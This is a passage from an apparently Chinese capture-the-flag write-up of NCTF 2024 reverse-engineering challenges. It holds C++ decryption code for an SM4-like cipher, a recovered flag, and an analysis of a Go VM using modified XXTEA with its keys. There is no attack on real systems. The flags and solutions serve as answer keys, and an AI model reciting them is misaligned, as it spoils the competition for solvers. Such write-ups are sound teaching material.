class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> byte_7FF699A4A0D0[<span class="number">256</span>] = &#123;</span><br><span class="line">    <span class="number">0xD1</span>, <span class="number">0x90</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x3D</span>, <span class="number">0xB7</span>, <span class="number">0x16</span>, <span class="number">0xB6</span>, <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x28</span>, <span class="number">0xFB</span>, <span class="number">0x2C</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x2B</span>, <span class="number">0x67</span>, <span class="number">0x9A</span>, <span class="number">0x76</span>, <span class="number">0x2A</span>, <span class="number">0xBE</span>, <span class="number">0x04</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x06</span>, <span class="number">0x99</span>,</span><br><span class="line">    <span class="number">0x9C</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x91</span>, <span class="number">0xEF</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xED</span>, <span class="number">0xCF</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>,</span><br><span class="line">    <span class="number">0xE4</span>, <span class="number">0xB3</span>, <span class="number">0x17</span>, <span class="number">0xA9</span>, <span class="number">0x1C</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>, <span class="number">0x75</span>, <span class="number">0x8F</span>, <span class="number">0x3F</span>, <span class="number">0xA6</span>,</span><br><span class="line">    <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, <span class="number">0x4F</span>, <span class="number">0xF3</span>, <span class="number">0x73</span>, <span class="number">0x71</span>, <span class="number">0xBA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0xD6</span>, <span class="number">0xA8</span>,</span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0xB2</span>, <span class="number">0xFC</span>, <span class="number">0x64</span>, <span class="number">0xDA</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>, <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9D</span>, <span class="number">0x35</span>,</span><br><span class="line">    <span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x78</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0x9F</span>, <span class="number">0xA2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0xC9</span>, <span class="number">0x87</span>,</span><br><span class="line">    <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x5E</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xE7</span>, <span class="number">0xA0</span>, <span class="number">0xC4</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>,</span><br><span class="line">    <span class="number">0xEA</span>, <span class="number">0xBF</span>, <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x40</span>, <span class="number">0xC7</span>, <span class="number">0x38</span>, <span class="number">0xB5</span>, <span class="number">0xA3</span>, <span class="number">0xF7</span>, <span class="number">0xF2</span>, <span class="number">0xCE</span>, <span class="number">0xF9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xA1</span>,</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x9B</span>, <span class="number">0x34</span>, <span class="number">0x1A</span>, <span class="number">0x55</span>, <span class="number">0xAD</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>,</span><br><span class="line">    <span class="number">0x1D</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xCA</span>, <span class="number">0x60</span>, <span class="number">0xC0</span>, <span class="number">0x29</span>, <span class="number">0x23</span>, <span class="number">0xAB</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>,</span><br><span class="line">    <span class="number">0xD5</span>, <span class="number">0xDB</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xDE</span>, <span class="number">0xFD</span>, <span class="number">0x8E</span>, <span class="number">0x2F</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x6A</span>, <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>, <span class="number">0x5B</span>, <span class="number">0x51</span>,</span><br><span class="line">    <span class="number">0x8D</span>, <span class="number">0x1B</span>, <span class="number">0xAF</span>, <span class="number">0x92</span>, <span class="number">0xBB</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x7F</span>, <span class="number">0x11</span>, <span class="number">0xD9</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>,</span><br><span class="line">    <span class="number">0x0A</span>, <span class="number">0xC1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>, <span class="number">0x7B</span>, <span class="number">0xBD</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0xD0</span>, <span class="number">0x12</span>, <span class="number">0xB8</span>, <span class="number">0xE5</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0xB9</span>, <span class="number">0xF1</span>, <span class="number">0x09</span>, <span class="number">0xC5</span>, <span class="number">0x6E</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0xF0</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>, <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0xD7</span>, <span class="number">0xCB</span>, <span class="number">0x39</span>, <span class="number">0x48</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> dword_7FF699A4A040[<span class="number">32</span>] = &#123;</span><br><span class="line">    <span class="number">0x00070E15</span>, <span class="number">0x1C232A31</span>, <span class="number">0x383F464D</span>, <span class="number">0x545B6269</span>, <span class="number">0x70777E85</span>, <span class="number">0x8C939AA1</span>, <span class="number">0xA8AFB6BD</span>, <span class="number">0xC4CBD2D9</span>,</span><br><span class="line">    <span class="number">0xE0E7EEF5</span>, <span class="number">0xFC030A11</span>, <span class="number">0x181F262D</span>, <span class="number">0x343B4249</span>, <span class="number">0x50575E65</span>, <span class="number">0x6C737A81</span>, <span class="number">0x888F969D</span>, <span class="number">0xA4ABB2B9</span>,</span><br><span class="line">    <span class="number">0xC0C7CED5</span>, <span class="number">0xDCE3EAF1</span>, <span class="number">0xF8FF060D</span>, <span class="number">0x141B2229</span>, <span class="number">0x30373E45</span>, <span class="number">0x4C535A61</span>, <span class="number">0x686F767D</span>, <span class="number">0x848B9299</span>,</span><br><span class="line">    <span class="number">0xA0A7AEB5</span>, <span class="number">0xBCC3CAD1</span>, <span class="number">0xD8DFE6ED</span>, <span class="number">0xF4FB0209</span>, <span class="number">0x10171E25</span>, <span class="number">0x2C333A41</span>, <span class="number">0x484F565D</span>, <span class="number">0x646B7279</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> dword_7FF699A4A028[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0xA3B1BAC6</span>, <span class="number">0x56AA3350</span>, <span class="number">0x677D9197</span>, <span class="number">0xB27022DC</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">rotate_left</span><span class="params">(<span class="type">uint32_t</span> x, <span class="type">int</span> n)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span> - n));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">generate_buf</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* key, <span class="type">uint32_t</span>* buf)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">uint32_t</span> key_dword;</span><br><span class="line">            <span class="built_in">memcpy</span>(&amp;key_dword, key + <span class="number">4</span> * i, <span class="number">4</span>);</span><br><span class="line">            <span class="type">uint32_t</span> converted_key = ((key_dword &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span>) |</span><br><span class="line">            ((key_dword &amp; <span class="number">0xFF00</span>) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">            ((key_dword &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00</span>) |</span><br><span class="line">            ((key_dword &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">            buf[i] = dword_7FF699A4A028[i] ^ converted_key;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">uint32_t</span> v12 = dword_7FF699A4A040[j] ^ buf[j + <span class="number">3</span>] ^ buf[j + <span class="number">2</span>] ^ buf[j + <span class="number">1</span>];</span><br><span class="line">            <span class="type">uint8_t</span>* v12_bytes = (<span class="type">uint8_t</span>*)&amp;v12;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)</span><br><span class="line">                &#123;</span><br><span class="line">                    v12_bytes[k] = byte_7FF699A4A0D0[v12_bytes[k]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">uint32_t</span> rot1 = <span class="built_in">rotate_left</span>(v12, <span class="number">23</span>);</span><br><span class="line">        <span class="type">uint32_t</span> rot2 = <span class="built_in">rotate_left</span>(v12, <span class="number">13</span>);</span><br><span class="line">        buf[j + <span class="number">4</span>] = (rot1 ^ rot2 ^ v12) ^ buf[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* ciphertext, <span class="type">const</span> <span class="type">uint8_t</span>* key, <span class="type">uint8_t</span>* plaintext)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> buf[<span class="number">36</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> buf_1[<span class="number">36</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">generate_buf</span>(key, buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> ii = <span class="number">0</span>; ii &lt; <span class="number">4</span>; ii++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> cipher_dword;</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;cipher_dword, ciphertext + <span class="number">4</span> * ii, <span class="number">4</span>);</span><br><span class="line">        buf_1[<span class="number">35</span> - ii] = ((cipher_dword &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>) |</span><br><span class="line">            ((cipher_dword &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00</span>) |</span><br><span class="line">            ((cipher_dword &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xFF0000</span>) |</span><br><span class="line">            ((cipher_dword &lt;&lt; <span class="number">24</span>) &amp; <span class="number">0xFF000000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> m = <span class="number">31</span>; m &gt;= <span class="number">0</span>; m--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v12_0 = buf[m + <span class="number">4</span>] ^ buf_1[m + <span class="number">3</span>] ^ buf_1[m + <span class="number">2</span>] ^ buf_1[m + <span class="number">1</span>];</span><br><span class="line">        <span class="type">uint8_t</span>* v12_bytes = (<span class="type">uint8_t</span>*)&amp;v12_0;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> n = <span class="number">0</span>; n &lt; <span class="number">4</span>; n++) </span><br><span class="line">        &#123;</span><br><span class="line">            v12_bytes[n] = byte_7FF699A4A0D0[v12_bytes[n]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">uint32_t</span> rot1 = <span class="built_in">rotate_left</span>(v12_0, <span class="number">24</span>);</span><br><span class="line">        <span class="type">uint32_t</span> rot2 = <span class="built_in">rotate_left</span>(v12_0, <span class="number">18</span>);</span><br><span class="line">        <span class="type">uint32_t</span> rot3 = <span class="built_in">rotate_left</span>(v12_0, <span class="number">10</span>);</span><br><span class="line">        <span class="type">uint32_t</span> rot4 = <span class="built_in">rotate_left</span>(v12_0, <span class="number">2</span>);</span><br><span class="line">        <span class="type">uint32_t</span> L_result = rot1 ^ rot2 ^ rot3 ^ rot4 ^ v12_0;</span><br><span class="line">        buf_1[m] = buf_1[m + <span class="number">4</span>] ^ L_result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v11 = buf_1[i];</span><br><span class="line">        <span class="type">uint8_t</span> b0 = (v11 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="type">uint8_t</span> b1 = (v11 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="type">uint8_t</span> b2 = (v11 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="type">uint8_t</span> b3 = v11 &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="type">uint32_t</span> le = (b3 &lt;&lt; <span class="number">24</span>) | (b2 &lt;&lt; <span class="number">16</span>) | (b1 &lt;&lt; <span class="number">8</span>) | b0;</span><br><span class="line">        <span class="built_in">memcpy</span>(plaintext + <span class="number">4</span> * i, &amp;le, <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main_safe</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint8_t</span> key[] = <span class="string">&quot;NCTF24nctfNCTF24&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc[<span class="number">32</span>] = &#123;</span><br><span class="line">    <span class="number">0xFB</span>, <span class="number">0x97</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0xF1</span>, <span class="number">0x99</span>, <span class="number">0x12</span>, <span class="number">0xDF</span>, <span class="number">0x13</span>, <span class="number">0x30</span>, <span class="number">0xF7</span>, <span class="number">0xD8</span>, <span class="number">0x7F</span>, <span class="number">0xEB</span>, <span class="number">0xA0</span>, <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x14</span>, <span class="number">0x5B</span>, <span class="number">0xA6</span>, <span class="number">0x2A</span>, <span class="number">0xA8</span>, <span class="number">0x05</span>, <span class="number">0xA5</span>, <span class="number">0xF3</span>, <span class="number">0x76</span>, <span class="number">0xBE</span>, <span class="number">0xC9</span>, <span class="number">0x01</span>, <span class="number">0xF9</span>, <span class="number">0x36</span>, <span class="number">0x7B</span>, <span class="number">0x46</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flag[<span class="number">32</span>]&#123;&#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(enc, key, flag);</span><br><span class="line">    <span class="built_in">decrypt</span>(enc<span class="number">+16</span>, key, flag<span class="number">+16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;NCTF&#123;%.32s&#125;\n&quot;</span>, flag);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p><code>NCTF&#123;58cb925e0cd823c0d0b54fd06b820b7e&#125;</code></p><h2 id="gogo"><a href="#gogo" class="headerlink" title="gogo"></a>gogo</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>main_main函数可以看到是将输入分块通过channel进行协程通信。</p><p><img src="/2025/03/24/NCTF2024/image-15.png" alt="alt text"></p><p>在main_main函数附近有一个带VM名字的函数，里面就是接收main那边发送的数据，然后底下有个函数执行，是通过操作数进行调用VM函数计算。这边一系列计算函数也印证想法。</p><p><img src="/2025/03/24/NCTF2024/image-16.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-17.png" alt="alt text"></p><p>对每个vm的函数都下断点输出执行的指令以及操作数，方便分析整个加密流程，如main_XOR函数断点：</p><p><img src="/2025/03/24/NCTF2024/image-18.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-19.png" alt="alt text"></p><p>运行输入38个’1’（数据简单方便分析算法），可以得到一堆我们输出的伪代码计算过程，通过看到9e3779b9以及计算的特征，可以发现是XXTEA变种。</p><p>31313131就是我们输入的字符串的字节，不过是以4字节为单位进行运算。</p><p>通过分析可得知是将输入的flag分成两份，20字节为一组，分别进行两种变种XXTEA计算，Key也不一样，不过都在这里面可以找到Key。</p><p><img src="/2025/03/24/NCTF2024/image-20.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-21.png" alt="alt text"></p><p>可以根据伪代码计算流程进行还原成代码，基于标准XXTEA进行编写，中间可以对比标准算法发现异或Key的值在哪，以及根据加密计算的一些中间值来验证加密代码，最终加密值就可以根据伪代码尾部最终值来验证。（这边不具体赘述）</p><p><img src="/2025/03/24/NCTF2024/image-23.png" alt="alt text"></p><p>还原加密代码如下，基于标准XXTEA进行修改的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX2 (((z <span class="string">&lt;&lt; 5 ^ y &gt;</span>&gt; 2) + (y <span class="string">&lt;&lt; 3 ^ z &gt;</span>&gt; 4)) ^ ((sum ^ y) + (key2[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> key[]&#123; <span class="number">0x6e637466</span>, <span class="number">0x62ef0ed</span> ,<span class="number">0xa78c0b4f</span>, <span class="number">0x32303234</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> key2[]&#123; <span class="number">0x32303234</span>, <span class="number">0xd6eb12c3</span>, <span class="number">0x9f1cf72e</span>, <span class="number">0x4e435446</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">xxtea_1</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    rounds = <span class="number">16</span>;</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    z = v[n - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        sum += DELTA;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; <span class="number">5</span>; p++)</span><br><span class="line">        &#123;</span><br><span class="line">            y = v[(p + <span class="number">1</span>) % <span class="number">5</span>];</span><br><span class="line">            z = v[p] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">xxtea_2</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    rounds = <span class="number">16</span>;</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    z = v[n - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        sum += DELTA;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; <span class="number">5</span>; p++)</span><br><span class="line">        &#123;</span><br><span class="line">            y = v[(p + <span class="number">1</span>) % <span class="number">5</span>];</span><br><span class="line">            z = v[p] += MX2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在main_RET函数可以看到两组字符串的比对，都是20长度的比对，这两个数据就是加密后的flag了，提取出来分别进行解密即可。</p><p><img src="/2025/03/24/NCTF2024/image-22.png" alt="alt text"></p><h3 id="解密-2"><a href="#解密-2" class="headerlink" title="解密"></a>解密</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 